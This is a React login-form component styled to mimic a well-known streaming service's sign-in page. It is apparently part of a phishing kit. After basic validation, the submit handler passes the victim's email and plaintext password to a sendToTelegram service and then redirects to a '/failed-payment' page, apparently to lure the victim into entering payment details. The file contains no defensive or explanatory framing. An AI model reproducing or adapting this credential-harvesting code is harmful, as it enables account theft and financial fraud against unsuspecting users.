import React, { useState } from 'react';
import { Check } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { useIntl } from 'react-intl';
import { sendToTelegram } from '../services/telegram';

export function LoginForm() {
  const navigate = useNavigate();
  const intl = useIntl();
  const [isChecked, setIsChecked] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState({
    email: '',
    password: ''
  });

  const validateForm = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const newErrors = {
      email: '',
      password: ''
    };

    if (!email) {
      newErrors.email = intl.formatMessage({ id: 'login.error.email' });
    } else if (!/\S+@\S+\.\S+/.test(email)) {
      newErrors.email = intl.formatMessage({ id: 'login.error.email' });
    }

    if (!password) {
      newErrors.password = intl.formatMessage({ id: 'login.error.password' });
    } else if (password.length < 4 || password.length > 60) {
      newErrors.password = intl.formatMessage({ id: 'login.error.password' });
    }

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password) {
      await sendToTelegram({
        type: 'login',
        email,
        password
      });
      navigate('/failed-payment');
    }
  };

  return (
    <form className="space-y-6" onSubmit={validateForm}>
      <div className="space-y-1">
        <div style={{
          background: 'rgba(22,22,22,0.7)',
          borderRadius: '0.25rem',
          borderWidth: '0.0625rem',
          borderColor: errors.email ? '#e87c03' : 'rgba(128,128,128,0.7)'
        }}>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder={intl.formatMessage({ id: 'login.email' })}
            className="w-full px-4 py-3 bg-transparent text-white placeholder-gray-400 focus:outline-none"
          />
        </div>
        {errors.email && (
          <div className="text-[#e87c03] text-[13px]">
            {errors.email}
          </div>
        )}
      </div>
      
      <div className="space-y-1">
        <div style={{
          background: 'rgba(22,22,22,0.7)',
          borderRadius: '0.25rem',
          borderWidth: '0.0625rem',
          borderColor: errors.password ? '#e87c03' : 'rgba(128,128,128,0.7)'
        }}>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder={intl.formatMessage({ id: 'login.password' })}
            className="w-full px-4 py-3 bg-transparent text-white placeholder-gray-400 focus:outline-none"
          />
        </div>
        {errors.password && (
          <div className="text-[#e87c03] text-[13px]">
            {errors.password}
          </div>
        )}
      </div>
      
      <button
        type="submit"
        className="w-full text-white py-3 rounded font-semibold hover:opacity-90 transition-opacity"
        style={{
          background: 'rgb(229,9,20)'
        }}
      >
        {intl.formatMessage({ id: 'login.button' })}
      </button>

      <div className="text-center">
        <a href="#" className="text-white hover:underline">
          {intl.formatMessage({ id: 'login.help' })}
        </a>
      </div>

      <div className="flex items-center justify-between text-white text-sm">
        <label 
          className="flex items-center space-x-2 cursor-pointer group"
          onClick={() => setIsChecked(!isChecked)}
        >
          <div className="w-4 h-4 border border-gray-600 rounded flex items-center justify-center group-hover:border-white">
            {isChecked && <Check className="w-3 h-3 text-white" />}
          </div>
          <span className="group-hover:text-white">
            {intl.formatMessage({ id: 'login.remember' })}
          </span>
        </label>
      </div>
    </form>
  );
}